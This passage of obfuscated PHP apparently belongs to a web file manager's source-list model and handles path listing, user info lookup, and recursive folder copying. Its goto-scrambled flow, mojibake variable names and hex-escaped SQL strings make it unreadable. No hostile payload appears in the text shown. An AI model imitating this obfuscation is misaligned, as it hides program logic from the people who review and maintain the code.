(!isset($A½óÈ‘‡Ü[$f‚ß…ëœÇÙ])) { $A½óÈ‘‡Ü[$f‚ß…ëœÇÙ] = 0; } } } goto eŒáÙˆ­ó£; eŒáÙˆ­ó£: $Eí“ ›“Ó¾ = array(); foreach ($A½óÈ‘‡Ü as $f£ƒ³ÂÊÇ§ => $FæË˜Ö»Ÿ) { if (!$FæË˜Ö»Ÿ) { $Eí“ ›“Ó¾[] = $f£ƒ³ÂÊÇ§; } } if ($Eí“ ›“Ó¾) { $e¢§“ˆ—ß½ = array($FÈùØÊœÀ[26] => array($FÈùØÊœÀ[27], $Eí“ ›“Ó¾)); $bõ…è…óª = $this->field($FÈùØÊœÀ[105])->where($e¢§“ˆ—ß½)->select(); $b•“Á§¶Šã = array_to_keyvalue($bõ…è…óª, $FÈùØÊœÀ[2], $FÈùØÊœÀ[32]); $A½óÈ‘‡Ü = array_merge_index($A½óÈ‘‡Ü, $b•“Á§¶Šã); } goto B…Š•Şì¥; CÉØ¸É»Ú: } protected function _listAppendPathRoot(&$f»ğª…£¡, $b‹š‰Û–«Ş) { $e–»£‰ŒÊÔ =& $_SERVER[óÚ‚£ñ¶]; $cÚÆ½½í´Ï = $e–»£‰ŒÊÔ[1]; if ($f»ğª…£¡[$e–»£‰ŒÊÔ[9]] == self::TYPE_USER) { if ($f»ğª…£¡[$e–»£‰ŒÊÔ[94]] == USER_ID) { $cÚÆ½½í´Ï = LNG($e–»£‰ŒÊÔ[110]); if (!$b‹š‰Û–«Ş) { $f»ğª…£¡[$e–»£‰ŒÊÔ[32]] = $cÚÆ½½í´Ï; } } else { $fççî–Ë‘ = Model($e–»£‰ŒÊÔ[111])->getInfoSimple($f»ğª…£¡[$e–»£‰ŒÊÔ[94]]); $cÚÆ½½í´Ï = $e–»£‰ŒÊÔ[112] . $fççî–Ë‘[$e–»£‰ŒÊÔ[32]] . $e–»£‰ŒÊÔ[113]; } } else { if ($f»ğª…£¡[$e–»£‰ŒÊÔ[9]] == self::TYPE_GROUP) { $fççî–Ë‘ = Model($e–»£‰ŒÊÔ[98])->getInfoSimple($f»ğª…£¡[$e–»£‰ŒÊÔ[94]]); $cÚÆ½½í´Ï = $fççî–Ë‘[$e–»£‰ŒÊÔ[32]]; } else { if ($f»ğª…£¡[$e–»£‰ŒÊÔ[9]] == self::TYPE_SYSTEM) { $fççî–Ë‘ = $this->sourceInfo($b‹š‰Û–«Ş[0], !0); $cÚÆ½½í´Ï = $fççî–Ë‘[$e–»£‰ŒÊÔ[32]]; } } } $cÚÆ½½í´Ï = $cÚÆ½½í´Ï ? $e–»£‰ŒÊÔ[106] . $cÚÆ½½í´Ï . $e–»£‰ŒÊÔ[106] : $e–»£‰ŒÊÔ[106]; return $cÚÆ½½í´Ï; } protected function _listAppendUser(&$CÃ¾šèÚö) { $eì—¸Ò»  =& $_SERVER[óÚ‚£ñ¶]; $e²£¹¬Šìğ = array_to_keyvalue($CÃ¾šèÚö, $eì—¸Ò» [1], $eì—¸Ò» [20]); $b‹‘Ãã×Äã = array_to_keyvalue($CÃ¾šèÚö, $eì—¸Ò» [1], $eì—¸Ò» [21]); $f·²ğµŒì = array_merge($e²£¹¬Šìğ, $b‹‘Ãã×Äã); $AÍÄõŒµùõ = Model($eì—¸Ò» [114])->userListInfo($f·²ğµŒì); foreach ($CÃ¾šèÚö as &$bÔù„¾Ñƒİ) { $fŒ ·”ñºõ = $bÔù„¾Ñƒİ[$eì—¸Ò» [20]]; $bÔù„¾Ñƒİ[$eì—¸Ò» [20]] = $AÍÄõŒµùõ[$fŒ ·”ñºõ] ? $AÍÄõŒµùõ[$fŒ ·”ñºõ] : !1; $fŒ ·”ñºõ = $bÔù„¾Ñƒİ[$eì—¸Ò» [21]]; $bÔù„¾Ñƒİ[$eì—¸Ò» [21]] = $AÍÄõŒµùõ[$fŒ ·”ñºõ] ? $AÍÄõŒµùõ[$fŒ ·”ñºõ] : !1; if ($bÔù„¾Ñƒİ[$eì—¸Ò» [62]] && $bÔù„¾Ñƒİ[$eì—¸Ò» [62]][$eì—¸Ò» [115]]) { $AÒøùº¥›… = $GLOBALS[$eì—¸Ò» [116]][$eì—¸Ò» [117]][$eì—¸Ò» [118]]; if ($bÔù„¾Ñƒİ[$eì—¸Ò» [62]][$eì—¸Ò» [119]] <= time() - $AÒøùº¥›…) { $this->metaSet($bÔù„¾Ñƒİ[$eì—¸Ò» [2]], $eì—¸Ò» [115], null); $this->metaSet($bÔù„¾Ñƒİ[$eì—¸Ò» [2]], $eì—¸Ò» [119], null); unset($bÔù„¾Ñƒİ[$eì—¸Ò» [62]][$eì—¸Ò» [115]]); continue; } $fÒ¾Ç¹´çì = $bÔù„¾Ñƒİ[$eì—¸Ò» [62]][$eì—¸Ò» [115]]; $bÔù„¾Ñƒİ[$eì—¸Ò» [62]][$eì—¸Ò» [120]] = Model($eì—¸Ò» [114])->getInfoSimpleOuter($fÒ¾Ç¹´çì); } } } public function parentLevelArray($Eô—÷İÌ³å) { $Bé…®Æ®´ =& $_SERVER[óÚ‚£ñ¶]; $Eô—÷İÌ³å = explode($Bé…®Æ®´[15], trim($Eô—÷İÌ³å, $Bé…®Æ®´[15])); return array_remove_value($Eô—÷İÌ³å, $Bé…®Æ®´[109]); } public function listAll($b†ñ°¢«çá) { goto Cîß¶Ñ˜÷; AÑ¿àÔŞ¼: $bß êä˜ã‡ = $EèÌáå…‘ï[125]; $Cº®œ×ÙÊø = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\x20\x66\151\x6c\145\40\157\156\x20\163\x6f\x75\x72\x63\x65\x2e\x66\x69\154\x65\x49\x44\x20\75\40\146\151\154\145\x2e\x66\151\x6c\145\x49\x44"; $cÁ æÊğšä = $this->alias($EèÌáå…‘ï[126])->field($bß êä˜ã‡)->where($DƒËÎ­º¶Ã)->join($Cº®œ×ÙÊø)->select(); goto e¬ğç‹Ú§¹; Cîß¶Ñ˜÷: $EèÌáå…‘ï =& $_SERVER[óÚ‚£ñ¶]; $bæã²ÄŞÕ = $this->sourceInfo($b†ñ°¢«çá); $DƒËÎ­º¶Ã = array($EèÌáå…‘ï[121] => array($EèÌáå…‘ï[122], $bæã²ÄŞÕ[$EèÌáå…‘ï[99]] . $b†ñ°¢«çá . $EèÌáå…‘ï[123]), $EèÌáå…‘ï[124] => 0); goto AÑ¿àÔŞ¼; f¬­ç˜ò ¶: $cÁ æÊğšä = array_to_keyvalue($cÁ æÊğšä, $EèÌáå…‘ï[2]); $dìÜòÈĞÇ‚ = "\57{$bæã²ÄŞÕ[$EèÌáå…‘ï[32]]}\x2f"; $dìÜòÈĞÇ‚ = $dìÜòÈĞÇ‚ == $EèÌáå…‘ï[108] ? $EèÌáå…‘ï[106] : $dìÜòÈĞÇ‚; goto C÷øí¹—á; C÷øí¹—á: $A¥·°ÁÁ½¶ = array(); foreach ($cÁ æÊğšä as $EÄ‘Ü‹Æ©› => $eÉ°…Á‚ãÙ) { goto e¤ìÑÄŒÆ; AŠ¾¼Ñ÷: if (!$eÉ°…Á‚ãÙ[$EèÌáå…‘ï[6]]) { $F¥°è«¢åÂ[$EèÌáå…‘ï[128]] = $eÉ°…Á‚ãÙ[$EèÌáå…‘ï[128]]; $F¥°è«¢åÂ[$EèÌáå…‘ï[129]] = $eÉ°…Á‚ãÙ[$EèÌáå…‘ï[4]]; } $A¥·°ÁÁ½¶[] = $F¥°è«¢åÂ; goto c³ŒÓœ°ÔÚ; bèøÔÍò¤Ä: for ($d¸íÚ ôÉ = 0; $d¸íÚ ôÉ < count($D¦Ş¯‹„µï); $d¸íÚ ôÉ++) { $CÊËÇ†òĞ .= $cÁ æÊğšä[$D¦Ş¯‹„µï[$d¸íÚ ôÉ]][$EèÌáå…‘ï[32]] . $EèÌáå…‘ï[106]; } $CÊËÇ†òĞ .= $eÉ°…Á‚ãÙ[$EèÌáå…‘ï[32]]; if ($eÉ°…Á‚ãÙ[$EèÌáå…‘ï[6]]) { $CÊËÇ†òĞ .= $EèÌáå…‘ï[106]; } goto c›ªåï‹öƒ; c›ªåï‹öƒ: $CÊËÇ†òĞ = str_replace($EèÌáå…‘ï[108], $EèÌáå…‘ï[106], $CÊËÇ†òĞ); $CÊËÇ†òĞ = str_replace($EèÌáå…‘ï[108], $EèÌáå…‘ï[106], $CÊËÇ†òĞ); $F¥°è«¢åÂ = array($EèÌáå…‘ï[33] => str_replace($EèÌáå…‘ï[108], $EèÌáå…‘ï[106], $CÊËÇ†òĞ), $EèÌáå…‘ï[127] => intval($eÉ°…Á‚ãÙ[$EèÌáå…‘ï[6]]), $EèÌáå…‘ï[37] => $this->pathInfoFilter($eÉ°…Á‚ãÙ, !0)); goto AŠ¾¼Ñ÷; e¤ìÑÄŒÆ: $D¦Ş¯‹„µï = $this->parentLevelArray($eÉ°…Á‚ãÙ[$EèÌáå…‘ï[99]]); array_shift($D¦Ş¯‹„µï); $CÊËÇ†òĞ = $dìÜòÈĞÇ‚; goto bèøÔÍò¤Ä; c³ŒÓœ°ÔÚ: } return $A¥·°ÁÁ½¶; goto FÕïºïµƒÜ; e¬ğç‹Ú§¹: $this->_listAppendAuth($cÁ æÊğšä); $this->_listAppendUser($cÁ æÊğšä); $this->_listAppendPath($cÁ æÊğšä); goto f¬­ç˜ò ¶; FÕïºïµƒÜ: } } class SourceListMoveModel extends SourceListModel { public function isParentOf($aªººŒ‰ÅŠ, $BÌª¡£Î®) { goto F‹¸øğèè»; C´ó²½’–›: $dŞĞô±Ù±‹ = $C‘ĞùöÅµ­[$DèÕ¼ù¥…²[373]] . $C‘ĞùöÅµ­[$DèÕ¼ù¥…²[374]] . $DèÕ¼ù¥…²[47]; $f¾¬‚â’Æù = $aäŒƒ‰·ç¡[$DèÕ¼ù¥…²[373]] . $aäŒƒ‰·ç¡[$DèÕ¼ù¥…²[374]] . $DèÕ¼ù¥…²[47]; $b½é­±Ôì÷ = strpos($f¾¬‚â’Æù, $dŞĞô±Ù±‹) === 0; goto aÚó£öÒº; F‹¸øğèè»: $DèÕ¼ù¥…² =& $_SERVER[İåâé¾]; $C‘ĞùöÅµ­ = $this->sourceInfo($aªººŒ‰ÅŠ); $aäŒƒ‰·ç¡ = $this->sourceInfo($BÌª¡£Î®); goto C´ó²½’–›; aÚó£öÒº: return $b½é­±Ôì÷; goto Aœê¶¾Á¹«; Aœê¶¾Á¹«: } public function copy($cÜ¬ßğçö, $FˆÙ–ù›Ñ, $eóâƒ‚Œ‡ = REPEAT_REPLACE, $Dõßœ¸½‡â = '') { goto BÉöÛÀë³‡; cñœãòÁøˆ: if (!$a¾™—â || !$D…¸‹¼ê¿Á || $D…¸‹¼ê¿Á[$Bƒ‹Œ……Ä[375]] != $Bƒ‹Œ……Ä[376]) { return !1; } if ($this->isParentOf($cÜ¬ßğçö, $FˆÙ–ù›Ñ)) { return !1; } $bÃ×ø³Ôâ” = array($Bƒ‹Œ……Ä[377] => array(), $Bƒ‹Œ……Ä[378] => array(), $Bƒ‹Œ……Ä[379] => array()); goto cèŞñ ­â; aÔ•Ä˜ ±: $this->saveAll($bÃ×ø³Ôâ”[$Bƒ‹Œ……Ä[379]]); Model($Bƒ‹Œ……Ä[163])->linkAdd($bÃ×ø³Ôâ”[$Bƒ‹Œ……Ä[377]]); $this->folderSizeReset($FˆÙ–ù›Ñ); goto eÂ“Æ’‘È¨; BÉöÛÀë³‡: $Bƒ‹Œ……Ä =& $_SERVER[İåâé¾]; $a¾™—â = $this->sourceInfo($cÜ¬ßğçö); $D…¸‹¼ê¿Á = $this->sourceInfo($FˆÙ–ù›Ñ); goto cñœãòÁøˆ; cèŞñ ­â: $e·”ğŸÉ¤š = $this->fileNameExistCache($FˆÙ–ù›Ñ, $a¾™—â[$Bƒ‹Œ……Ä[28]]); $aÙ†˜‰’éî = $this->_copy($cÜ¬ßğçö, $FˆÙ–ù›Ñ, $eóâƒ‚Œ‡, $bÃ×ø³Ôâ”, !0, $Dõßœ¸½‡â); $this->_childrenListClear(); goto féºİç‡ùŞ; féºİç‡ùŞ: if ($a¾™—â[$Bƒ‹Œ……Ä[375]] == $Bƒ‹Œ……Ä[376] && $e·”ğŸÉ¤š == $aÙ†˜‰’éî) { $this->folderSizeResetChildren($e·”ğŸÉ¤š); } Model($Bƒ‹Œ……Ä[380])->addAll($bÃ×ø³Ôâ”[$Bƒ‹Œ……Ä[378]], array(), !0); Model($Bƒ‹Œ……Ä[381])->eventCopy($aÙ†˜‰’éî); goto aÔ•Ä˜ ±; eÂ“Æ’‘È¨: $this->updateModifyTime($FˆÙ–ù›Ñ); return $aÙ†˜‰’éî; goto fò“á´†­Õ; fò“á´†­Õ: } private function _copy($eâ›²¨¨¡¾, $cª£åèã¾¡, $AÊø§îªÍí, &$f´½òÔŸÔ±, $aë®˜‰Œ , $f¥³æ›õ¶œ = '') { goto AÆ£ö¬¢Å«; AÆ£ö¬¢Å«: $d±ÔêïÉ¡ =& $_SERVER[İåâé¾]; $D±¾¡ ôãğ = $this->sourceInfoCache($eâ›²¨¨¡¾); $DÒ‰òÔã±Ø = $D±¾¡ ôãğ[$d±ÔêïÉ¡[375]] == $d±ÔêïÉ¡[376]; goto FÜæšâŸùÇ; FÜæšâŸùÇ: $dÈîŠëˆß» = $f¥³æ›õ¶œ ? $f¥³æ›õ¶œ : $D±¾¡ ôãğ[$d±ÔêïÉ¡[28]]; $B†Ş çİÃ = $this->fileNameExistCache($cª£åèã¾¡, $dÈîŠëˆß»); if ($aë®˜‰Œ ) { $this->_childrenAllMake($eâ›²¨¨¡¾); if ($DÒ‰òÔã±Ø && $B†Ş çİÃ) { $this->_childrenAllMake($B†Ş çİÃ); } } goto bƒÚòñš; bƒÚòñš: if (!$B†Ş çİÃ) { return $this->_copyCreate($eâ›²¨¨¡¾, $cª£åèã¾¡, $dÈîŠëˆß», $f´½òÔŸÔ±); } $Fâ¡•Õ­‡Û = $B†Ş çİÃ; if ($DÒ‰òÔã±Ø) { if ($AÊø§îªÍí == REPEAT_RENAME_FOLDER) { $dÈîŠëˆß» = $this->fileNameAutoCache($cª£åèã¾¡, $dÈîŠëˆß», $AÊø§îªÍí, $DÒ‰òÔã±Ø); $Fâ¡•Õ­‡Û = $this->_copyCreate($eâ›²¨¨¡¾, $cª£åèã¾¡, $dÈîŠëˆß», $f´½òÔŸÔ±); } else { $AÚã‰…êãÜ = $this->_childrenList($eâ›²¨¨¡¾); foreach ($AÚã‰…êãÜ as $CÄ£ÃŸõ•Ø) { $this->_copy($CÄ£ÃŸõ•Ø[$d±ÔêïÉ¡[374]], $B†Ş çİÃ, $AÊø§îªÍí, $f´½òÔŸÔ±, !1); } } } else { if ($AÊø§îªÍí == REPEAT_RENAME || $AÊø§îªÍí == REPEAT_RENAME_FOLDER) { $dÈîŠëˆß» = $this->fileNameAutoCache($cª£åèã¾¡, $dÈîŠëˆß», $AÊø§îªÍí, $DÒ‰òÔã±Ø); $Fâ¡•Õ­‡Û = $this->_copyCreate($eâ›²¨¨¡¾, $cª£åèã¾¡, $dÈîŠëˆß», $f´½òÔŸÔ±); } else { if ($AÊø§îªÍí == REPEAT_REPLACE) { $fÛõ„º“Á„ = $this->sourceInfoCache($B†Ş çİÃ); $EôÂÖö•¬Ô = $this->fileHistory($fÛõ„º“Á„, $D±¾¡ ôãğ[$d±ÔêïÉ¡[382]], $D±¾¡ ôãğ[$d±ÔêïÉ¡[78]]); if ($EôÂÖö•¬Ô) { $f´½òÔŸÔ±[$d±ÔêïÉ¡[377]][] = $D±¾¡ ôãğ[$d±ÔêïÉ¡[382]]; } } else { if ($AÊø§îªÍí == REPEAT_SKIP) { } } } } goto E¦ãğ©ˆ¢Ó; E¦ãğ©ˆ¢Ó: return $Fâ¡•Õ­‡Û; goto C²½ëåù«ï; C²½ëåù«ï: } private function _copyCreate($B©®š´Ş²¿, $cäìØ¢¶Çç, $Cøì…¢¿×, &$eË…ªè•‰Å) { goto f£‰°ó¢ÂÜ; Eéßõº×Æè: $this->addAll($D‰«Ñ«©‡Ç); $aš¾ö•ˆ¨ = $this->where(array($C…ŠÍÈãÍ[384] => $bçŞùĞ“Ü•))->select(); $aŸÚí½Ÿö· = $this->_childrenMakeRelation($F›Üâ¿Éù–, $aš¾ö•ˆ¨); goto Cìœƒ„¬•Ş; f£‰°ó¢ÂÜ: $C…ŠÍÈãÍ =& $_SERVER[İåâé¾]; $AÂßØ»Ÿğ‚ = $this->sourceInfoCache($B©®š´Ş²¿); $Aˆ‘ÜÊóî« = $this->sourceInfoCache($cäìØ¢¶Çç); goto DæÊ¸º²”ñ; A†ôÙğ©ß‡: if (count($F›Üâ¿Éù–) == 0) { return $bçŞùĞ“Ü•; } $bØ¼„á·É‘ = $this->sourceInfo($bçŞùĞ“Ü•); foreach ($F›Üâ¿Éù– as $bÚƒ‡‘ç) { $bß—¤¨”« = $this->_makeItemData($bÚƒ‡‘ç, $bØ¼„á·É‘, $bÚƒ‡‘ç[$C…ŠÍÈãÍ[28]]); $bß—¤¨”«[$C…ŠÍÈãÍ[373]] = $bÚƒ‡‘ç[$C…ŠÍÈãÍ[373]]; $D‰«Ñ«©‡Ç[] = $bß—¤¨”«; } goto Eéßõº×Æè; Fİ—ù¯õ‰: $b›™ñÈ÷¹ï = array($C…ŠÍÈãÍ[374] => $bçŞùĞ“Ü•, $C…ŠÍÈãÍ[28] => $Cøì…¢¿×); $this->_copyApplyMeta($b›™ñÈ÷¹ï, $eË…ªè•‰Å); if ($AÂßØ»Ÿğ‚[$C…ŠÍÈãÍ[375]] != $C…ŠÍÈãÍ[376]) { $eË…ªè•‰Å[$C…ŠÍÈãÍ[377]][] = $AÂßØ»Ÿğ‚[$C…ŠÍÈãÍ[382]]; return $bçŞùĞ“Ü•; } goto EÑæ×ù¯áÑ; DæÊ¸º²”ñ: $c•Ö„¼Ûâ = $this->_makeItemData($AÂßØ»Ÿğ‚, $Aˆ‘ÜÊóî«, $Cøì…¢¿×); Hook::trigger($C…ŠÍÈãÍ[383], $c•Ö„¼Ûâ); $bçŞùĞ“Ü• = $this->add($c•Ö„¼Ûâ); goto Fİ—ù¯õ‰; D²¶¼ñïß–: return $bçŞùĞ“Ü•; goto b«ÃìÙ‰î; Cìœƒ„¬•Ş: $aŸÚí½Ÿö·[$B©®š´Ş²¿] = $bçŞùĞ“Ü•; $d¯·Â«ÛÒˆ = array(); $D¿‡âºÚÇœ = array(); goto A‡µóÈôØé; EÑæ×ù¯áÑ: $F›Üâ¿Éù– = array(); $D‰«Ñ«©‡Ç = array(); $this->_childrenListAll($B©®š´Ş²¿, $F›Üâ¿Éù–); goto A†ôÙğ©ß‡; A‡µóÈôØé: foreach ($aš¾ö•ˆ¨ as $bÚƒ‡‘ç) { $aÊÎçá‘š = $bÚƒ‡‘ç[$C…ŠÍÈãÍ[374]]; $e—ƒ¼Ù¦ëÃ = $this->_childrenMatch($aŸÚí½Ÿö·, $bÚƒ‡‘ç, $bØ¼„á·É‘); $d¯·Â«ÛÒˆ[] = array($C…ŠÍÈãÍ[374], $aÊÎçá‘š, $C…ŠÍÈãÍ[384], $e—ƒ¼Ù¦ëÃ[$C…ŠÍÈãÍ[384]]); $D¿‡âºÚÇœ[] = array($C…ŠÍÈãÍ[374], $aÊÎçá‘š, $C…ŠÍÈãÍ[373], $e—ƒ¼Ù¦ëÃ[$C…ŠÍÈãÍ[373]]); $this->_copyApplyMeta($bÚƒ‡‘ç, $eË…ªè•‰Å); if ($bÚƒ‡‘ç[$C…ŠÍÈãÍ[375]] != $C…ŠÍÈãÍ[376]) { $eË…ªè•‰Å[$C…ŠÍÈãÍ[377]][] = $bÚƒ‡‘ç[$C…ŠÍÈãÍ[382]]; } } $this->saveAll($d¯·Â«ÛÒˆ); $this->saveAll($D¿‡âºÚÇœ); goto D²¶¼ñïß–; b«ÃìÙ‰î: } private function _childrenMakeRelation($Bã¯§ÉÇÆâ, $FàƒŠÑçÂê) { $BğÙæµëÆ =& $_SERVER[İåâé¾]; $DÉÏ³àù‡¦ = array(); $a§¬Ï¼Ö = array(); foreach ($Bã¯§ÉÇÆâ as $bŠËóØïÎ) { $bè”ØÔ¤ÌÚ = $bŠËóØïÎ[$BğÙæµëÆ[28]] . $BğÙæµëÆ[8] . $bŠËóØïÎ[$BğÙæµëÆ[373]]; $DÉÏ³àù‡¦[$bè”ØÔ¤ÌÚ] = $bŠËóØïÎ[$BğÙæµëÆ[374]]; } foreach ($FàƒŠÑçÂê as $bŠËóØïÎ) { $bè”ØÔ¤ÌÚ = $bŠËóØïÎ[$BğÙæµëÆ[28]] . $BğÙæµëÆ[8] . $bŠËóØïÎ[$BğÙæµëÆ[373]]; $f‰ÖÜç›Œ = $DÉÏ³àù‡¦[$bè”ØÔ¤ÌÚ]; $a§¬Ï¼Ö[$f‰ÖÜç›Œ] = $bŠËóØïÎ[$BğÙæµëÆ[374]]; } return $a§¬Ï¼Ö; } private function _childrenMatch($A‹¸‰ŠÇÀ, $A¥‰Ä˜Ò‡¶, $fß¯–ˆÍ‚“) { goto CœÄİ™ô°Å; CœÄİ™ô°Å: $e¬õ®¥…Ô¤ =& $_SERVER[İåâé¾]; $eôö¿ªë¨ = $fß¯–ˆÍ‚“[$e¬õ®¥…Ô¤[373]]; $f²›”³ÎÌŞ = $this->parentLevelArray($A¥‰Ä˜Ò‡¶[$e¬õ®¥…Ô¤[373]]); goto fèñÜæò; fèñÜæò: $E¡Ê¥—¼ÅÅ = $A‹¸‰ŠÇÀ[$f²›”³ÎÌŞ[count($f²›”³ÎÌŞ) - 1]]; foreach ($f²›”³ÎÌŞ as $eÏˆµ¢…æ) { if (isset($A‹¸‰ŠÇÀ[$eÏˆµ¢…æ])) { $eôö¿ªë¨ .= $A‹¸‰ŠÇÀ[$eÏˆµ¢…æ] . $e¬õ®¥…Ô¤[385]; } } $eôö¿ªë¨ = rtrim($eôö¿ªë¨, $e¬õ®¥…Ô¤[47]) . $e¬õ®¥…Ô¤[47]; goto f±î¸“ƒòÚ; f±î¸“ƒòÚ: return array($e¬õ®¥…Ô¤[384] => $E¡Ê¥—¼ÅÅ, $e¬õ®¥…Ô¤[373] => $eôö¿ªë¨); goto B£«ŸÑ¶…; B£«ŸÑ¶…: } private function _makeItemData($dÉÉ‚¾¥ê, $b£ß™â…½, $DºŠÓ”Ç’ˆ) { $F»ÓÔºÄÛ¥ =& $_SERVER[İåâé¾]; $E‡¸·ÑÆï„ = array($F»ÓÔºÄÛ¥[386] => $dÉÉ‚¾¥ê[$F»ÓÔºÄÛ¥[375]], $F»ÓÔºÄÛ¥[387] => $DºŠÓ”Ç’ˆ, $F»ÓÔºÄÛ¥[388] => $dÉÉ‚¾¥ê[$F»ÓÔºÄÛ¥[389]], $F»ÓÔºÄÛ¥[390] => $dÉÉ‚¾¥ê[$F»ÓÔºÄÛ¥[382]], $F»ÓÔºÄÛ¥[391] => $dÉÉ‚¾¥ê[$F»ÓÔºÄÛ¥[78]], $F»ÓÔºÄÛ¥[392] => $b£ß™â…½[$F»ÓÔºÄÛ¥[393]], $F»ÓÔºÄÛ¥[394] => $b£ß™â…½[$F»ÓÔºÄÛ¥[395]], $F»ÓÔºÄÛ¥[396] => USER_ID, $F»ÓÔºÄÛ¥[397] => USER_ID, $F»ÓÔºÄÛ¥[398] => $b£ß™â…½[$F»ÓÔºÄÛ¥[374]], $F»ÓÔºÄÛ¥[399] => $b£ß™â…½[$F»ÓÔºÄÛ¥[373]] . $b£ß™â…½[$F»ÓÔºÄÛ¥[374]] . $F»ÓÔºÄÛ¥[47], $F»ÓÔºÄÛ¥[400] => 0); return $E‡¸·ÑÆï„; } private function _copyApplyMeta($cÑ³øñ¥Ëø, &$Aì‡õƒÍô„) { $BƒÅçÅºÔÅ =& $_SERVER[İåâé¾]; $EîØŠ¥¡®À = $cÑ³øñ¥Ëø[$BƒÅçÅºÔÅ[374]]; $cÙŒ½Œá = $cÑ³øñ¥Ëø[$BƒÅçÅºÔÅ[28]]; if (!isset($cÑ³øñ¥Ëø[$BƒÅçÅºÔÅ[401]]) || !$cÑ³øñ¥Ëø[$BƒÅçÅºÔÅ[401]] || $cÑ³øñ¥Ëø[$BƒÅçÅºÔÅ[401]] == $BƒÅçÅºÔÅ[402]) { $Aì‡õƒÍô„[$BƒÅçÅºÔÅ[379]][] = array($BƒÅçÅºÔÅ[374], $EîØŠ¥¡®À, $BƒÅçÅºÔÅ[401], short_id($EîØŠ¥¡®À)); } if (Input::check($cÙŒ½Œá, $BƒÅçÅºÔÅ[403])) { $Aì‡õƒÍô„[$BƒÅçÅºÔÅ[378]][] = array($BƒÅçÅºÔÅ[374] => $EîØŠ¥¡®À, $BƒÅçÅºÔÅ[88] => $BƒÅçÅºÔÅ[404], $BƒÅçÅºÔÅ[359] => str_replace($BƒÅçÅºÔÅ[50], $BƒÅçÅºÔÅ[33], Pinyin::encode($cÙŒ½Œá))); $Aì‡õƒÍô„[$BƒÅçÅºÔÅ[378]][] = array($BƒÅçÅºÔÅ[374] => $EîØŠ¥¡®À, $BƒÅçÅºÔÅ[88] => $BƒÅçÅºÔÅ[405], $BƒÅçÅºÔÅ[359] => Pinyin::encode($cÙŒ½Œá, $BƒÅçÅºÔÅ[406])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($cöÔ‚¹È) { goto cØĞÃÜ–Ï; cØĞÃÜ–Ï: $E„„ªÖÏÚ =& $_SERVER[İåâé¾]; $fÉ«”£âù˜ = $this->sourceInfo($cöÔ‚¹È); $B“—ºÎšÌò = $E„„ªÖÏÚ[407]; goto aŸ‡§‹‡²; aŸ‡§‹‡²: $fâµãË¨‹ = array($E„„ªÖÏÚ[373] => array($E„„ªÖÏÚ[408], $fÉ«”£âù˜[$E„„ªÖÏÚ[373]] . $cöÔ‚¹È . $E„„ªÖÏÚ[409]), $E„„ªÖÏÚ[410] => 0); $eĞâƒ™ùÅù = $this->field($B“—ºÎšÌò)->where($fâµãË¨‹)->select(); if (!$eĞâƒ™ùÅù) { return; } goto fÌš»¯¤®; fÌš»¯¤®: $eĞâƒ™ùÅù = array_to_keyvalue($eĞâƒ™ùÅù, $E„„ªÖÏÚ[374]); foreach ($eĞâƒ™ùÅù as $DèÉáÊ”¨) { $EçÔÁ÷ËÛ = $DèÉáÊ”¨[$E„„ªÖÏÚ[384]]; $cöÔ‚¹È = $DèÉáÊ”¨[$E„„ªÖÏÚ[374]]; if (!isset($this->_childrenListCache[$cöÔ‚¹È]) && $DèÉáÊ”¨[$E„„ªÖÏÚ[375]] == $E„„ªÖÏÚ[376]) { $this->_childrenListCache[$cöÔ‚¹È] = array(); } if (!isset($this->_childrenListCache[$EçÔÁ÷ËÛ])) { $this->_childrenListCache[$EçÔÁ÷ËÛ] = array(); } $this->_childrenListCache[$EçÔÁ÷ËÛ][$cöÔ‚¹È] = $DèÉáÊ”¨; $this->_childrenItemCache[$cöÔ‚¹È] = $DèÉáÊ”¨; } goto F÷®ˆ“™Îë; F÷®ˆ“™Îë: } private function _childrenListAll($FÃÔ¬É­à, &$D“¢´Ã¦¤ì) { $b”ŞÓ½¦êÄ =& $_SERVER[İåâé¾]; if (!isset($this->_childrenListCache[$FÃÔ¬É­à])) { return; } $DÕÂ¶›Ò÷Ë = $this->_childrenListCache[$FÃÔ¬É­à]; foreach ($DÕÂ¶›Ò÷Ë as $C„íÓ‘ßëÇ => $Dğ—©ñ¯ùÂ) { $D“¢´Ã¦¤ì[$C„íÓ‘ßëÇ] = $Dğ—©ñ¯ùÂ; if ($Dğ—©ñ¯ùÂ[$b”ŞÓ½¦êÄ[375]] == $b”ŞÓ½¦êÄ[376]) { $this->_childrenListAll($C„íÓ‘ßëÇ, $D“¢´Ã¦¤ì); } } } private function sourceInfoCache($DïçµÕÈìŠ) { if (isset($this->_childrenItemCache[$DïçµÕÈìŠ])) { return $this->_childrenItemCache[$DïçµÕÈìŠ]; } return $this->sourceInfo($DïçµÕÈìŠ); } private function _childrenList($E¬Í¢¡Õ¼¶) { if (isset($this->_childrenListCache[$E¬Í¢¡Õ¼¶])) { return $this->_childrenListCache[$E¬Í¢¡Õ¼¶]; } return $this->_childrenListSelect($E¬Í¢¡Õ¼¶); } private function _childrenListSelect($aäˆÃ£®¦˜) { goto eçôÓÚÃÛ; C¤Ğæ†ˆ½: foreach ($aÈ½Û˜åÕ¦ as $aäˆÃ£®¦˜ => $bŒ¤§”ÂÒ”) { $this->_childrenItemCache[$aäˆÃ£®¦˜] = $bŒ¤§”ÂÒ”; } return $aÈ½Û˜åÕ¦; goto a‰ÒœÜª›‘; A†Å”Ğ¿ ‰: $bğ¿ó‡‡ï = $bğ¿ó‡‡ï ? $bğ¿ó‡‡ï : array(); $aÈ½Û˜åÕ¦ = array_to_keyvalue($bğ¿ó‡‡ï, $DŸŒÁÆÇ¾´[374]); $this->_childrenListCache[$aäˆÃ£®¦˜] = $aÈ½Û˜åÕ¦; goto C¤Ğæ†ˆ½; eçôÓÚÃÛ: $DŸŒÁÆÇ¾´ =& $_SERVER[İåâé¾]; $EÃ¶íÍß = array($DŸŒÁÆÇ¾´[384] => $aäˆÃ£®¦˜, $DŸŒÁÆÇ¾´[410] => 0); $bğ¿ó‡‡ï = $this->where($EÃ¶íÍß)->select(); goto A†Å”Ğ¿ ‰; a‰ÒœÜª›‘: } private function fileNameExistCache($F«¨ÑŞŸœ, $cØéÈŒœÙ‹) { $C®ºÛÈªÁ† =& $_SERVER[İåâé¾]; $cØéÈŒœÙ‹ = strtolower($cØéÈŒœÙ‹); $F¹Îá‡òÉ† = $this->_childrenList($F«¨ÑŞŸœ); foreach ($F¹Îá‡òÉ† as $E®ïÇÔĞÌà) { if 